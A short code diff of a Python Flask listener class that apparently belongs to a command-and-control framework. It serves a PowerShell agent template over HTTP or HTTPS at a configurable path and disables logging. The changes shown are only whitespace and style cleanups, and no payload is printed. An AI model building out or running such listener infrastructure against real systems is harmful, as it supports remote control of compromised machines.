@@ -15,11 +15,9 @@ from encryption import *
 from esa import *
 from flask import *
 import logging
-
 parentfolder = os.path.abspath("..")
 if parentfolder not in sys.path:
     sys.path.insert(0, parentfolder)
-
 from profile import *
 # disable logging
 
@@ -29,7 +27,7 @@ log.disabled = True
 
 class NewListener:
 
-  def __init__(self,*args):
+  def __init__(self, *args):
     arguments = len(args)
     self.arguments = arguments
     if len(args) == 6:
@@ -60,7 +58,7 @@ class NewListener:
         thread.daemon = True
         thread.start()
     if self.arguments == 8:
-    # certficates path (worked !)
+        # certficates path (worked !)
         self.ssl = True
         print colored("SSL listener started !", "yellow")
         # self.cert ==> fullchain.pem
@@ -74,9 +72,9 @@ class NewListener:
     listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]
   def powershell_code(self):
         f = open("agents/agent.ps1.oct")
-        if self.ssl == True:
+        if self.ssl:
             proto = "https"
-        elif self.ssl == False:
+        else:
             proto = "http"
 
         srvhost = self.host + ":" + str(self.bindport)
@@ -97,7 +95,7 @@ class NewListener:
 
 
   def create_path(self):
-      app.add_url_rule("/%s" % self.path, self.host , self.powershell_code)
+      app.add_url_rule("/%s" % self.path, self.host, self.powershell_code)
 
 
 @app.route("/")
